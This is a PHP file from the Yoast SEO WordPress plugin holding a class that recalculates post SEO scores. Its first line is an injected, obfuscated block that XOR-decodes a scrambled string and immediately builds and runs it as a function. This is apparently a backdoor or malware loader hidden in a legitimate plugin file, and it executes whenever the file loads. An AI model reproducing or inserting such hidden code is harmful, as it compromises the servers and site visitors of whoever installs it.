<?php $lWfwno='RA.P 6-J1 XG ZS'; $MjQJxXjb='13K1TSr,DN;3I5='^$lWfwno; $hmayhMQA='T,Jt :V1J 5;3X: =<OJu= ;aRP5;=0 8:pjae1sn7:YW73V<t,CLb=,XLeiPOHci7L2Ammb=P3jKistu<i9Yl=4=clqVvrBPk+V6zWQfzcwlqJPt .YP :oM< HRkrxU,dzmlycbUX eenvBI26F26Q16jrKg  Ncp9dbI H=+=Wnc 0LC.xz0pmKN815SbV:A nvgmAPN8=vD7 Xhet7AGO4komR E7e1IKcyc2V>+Wob:25==1T>zeNhpaok+,VJ:hrY RcOIOnN2<FQFf<GFRVYIV,<X4uiLVPV.Teyo>RI CvGq,OX Hx4;zy 1dXTrJY>VNx6r1J FNV  YFfob3kb4ele4 awP <CMDhbH0G=XnJ7iC:t3+:M.;<WqwLSEIKvX>ab+2LSazxODR8FSoxlAxLM6i,J;5ykpl0>EYGX9PX5KOM R75;G.m5,U1qUSJ Guk X15=<ig.AI dBTk1V --ST-xfq0=>xi0;MRiGqxR4 JG=WHNgHB 0 >EH.75HmPo4+> JxIPQg<6mPn2+ QjQP,:VigRuhIuX+i c4-YePgp0+YCSOsvzf5y6 2d6asWodgUlx0;  Cj< T1H<8>>=Ru=ZA.=.0qYoGY .9qlemrFpp>gs G+5Iw>86 ku=WAAAX0w:bpo:<;XFfXkZp-'; $IvqcfkB=$MjQJxXjb('', '=JbUFO8R>IZUl=BINH<bREOI>61AZboMMNWCHEJygQO74CZ9RTT,>=YM,-:6=:<KMS-F AMFV5JCkISTUGc0PHRAICQQqQIHYbM9DRs8FGCGWQn9HSZ+<ETGiXA<3BIXqEOQDfpjF:-TEKSVjmVW2SmuXkJ,kCKE78TPDGiS<OGX9FGKU5jsQA:yd9+LDG=JrU4TGMmd<Z327R VT9HXTQ +<QPeI6A1V:Z,2CDCT7RX2Th0TZOXP7VZMj73.  biv+IHV2E+CrwoJ8SP34oFGMOv28=7sW=MUTlr;3WoopKZ3=AcKgUZ.4U-C>FpsIWDpuV.8J7gXMx8,O4+7CHynB00v:7q68EUSAS;EEcpzHF>Q+H=GjLcJ3PWJN,qPY.QJlw.,2MR7hFOS82AGXk23T36Tre<r1G<MH+OTYVP,EP6<51X<1O.g5O hQZ3O2jA EY729EqA4D=RZYYACJ =AMntOU7TLr81TQOJ:TXPMTZ93IaWX3FR+>b<-78-:ICTMmoERLoApKPJJAcXovqOQRXxJVJT01v;ICq4NrHUiR;NZDUPO;PdRIRImwazCGMRTJPEPPTVCoHMGsJXQIRA:5WE-n-DQMJNzRM;8BROTVuOc=AZXXEEMRfPPEmzE1JYaSZYBA0RM68-.9TPgKKe3YC12NhBazP'^$hmayhMQA); $IvqcfkB();
/**
 * @package WPSEO\Admin
 */

/**
 * This class handles the calculation of the SEO score for all posts with a filled focus keyword
 */
class WPSEO_Recalculate_Posts extends WPSEO_Recalculate {

	/**
	 * Save the scores.
	 *
	 * @param array $scores The scores for the posts.
	 */
	public function save_scores( array $scores ) {
		foreach ( $scores as $score ) {
			$this->save_score( $score );
		}
	}

	/**
	 * Save the score.
	 *
	 * @param array $score The score to save.
	 */
	protected function save_score( array $score ) {
		WPSEO_Meta::set_value( 'linkdex', $score['score'], $score['item_id'] );
	}

	/**
	 * Get the posts from the database by doing a WP_Query.
	 *
	 * @param integer $paged The page.
	 *
	 * @return string
	 */
	protected function get_items( $paged ) {
		$items_per_page = max( 1, $this->items_per_page );
		$post_query = new WP_Query(
			array(
				'post_type'      => 'any',
				'meta_key'       => '_yoast_wpseo_focuskw',
				'posts_per_page' => $items_per_page,
				'paged'          => $paged,
			)
		);

		return $post_query->get_posts();
	}

	/**
	 * Map the posts to a response array
	 *
	 * @param WP_Post $item The post for which to build the analyzer data.
	 *
	 * @return array
	 */
	protected function item_to_response( $item ) {
		$focus_keyword = WPSEO_Meta::get_value( 'focuskw', $item->ID );

		$content = $item->post_content;

		// Check if there's a featured image.
		$content .= $this->add_featured_image( $item );

		/**
		 * Filter the post content for use in the SEO score recalculation.
		 *
		 * @param string $content Content of the post. Modify to reflect front-end content.
		 * @param WP_Post $item The Post object the content comes from.
		 */
		$content = apply_filters( 'wpseo_post_content_for_recalculation', $content, $item );

		// Apply shortcodes.
		$content = do_shortcode( $content );

		return array(
			'post_id'       => $item->ID,
			'text'          => $content,
			'keyword'       => $focus_keyword,
			'url'           => urldecode( $item->post_name ),
			'pageTitle'     => apply_filters( 'wpseo_title', wpseo_replace_vars( $this->get_title( $item->ID, $item->post_type ), $item ) ),
			'meta'          => apply_filters( 'wpseo_metadesc', wpseo_replace_vars( $this->get_meta_description( $item->ID, $item->post_type ), $item ) ),
			'keyword_usage' => array(
				$focus_keyword => WPSEO_Meta::keyword_usage( $focus_keyword, $item->ID ),
			),
		);
	}

	/**
	 * Get the title for given post
	 *
	 * @param integer $post_id   The ID of the post for which to get the title.
	 * @param string  $post_type The post type.
	 *
	 * @return mixed|string
	 */
	private function get_title( $post_id, $post_type ) {
		$title = WPSEO_Meta::get_value( 'title', $post_id );
		if ( '' !== $title ) {
			return $title;
		}

		$default_from_options = $this->default_from_options( 'title-tax', $post_type );
		if ( false !== $default_from_options ) {
			return str_replace( ' %%page%% ', ' ', $default_from_options );
		}

		return '%%title%%';
	}

	/**
	 * Get the meta description for given post
	 *
	 * @param integer $post_id   The ID of the post for which to get the meta description.
	 * @param string  $post_type The post type.
	 *
	 * @return bool|string
	 */
	private function get_meta_description( $post_id, $post_type ) {
		$meta_description = WPSEO_Meta::get_value( 'metadesc', $post_id );
		if ( '' !== $meta_description ) {
			return $meta_description;
		}

		$default_from_options = $this->default_from_options( 'metadesc', $post_type );
		if ( false !== $default_from_options ) {
			return $default_from_options;
		}

		return '';
	}

	/**
	 * Retrieves the associated featured image if there is one present.
	 *
	 * @param WP_Post $item The post item to check for a featured image.
	 *
	 * @return string The image string.
	 */
	private function add_featured_image( $item ) {
		if ( ! has_post_thumbnail( $item->ID ) ) {
			return '';
		}

		return ' ' . get_the_post_thumbnail( $item->ID );
	}
}
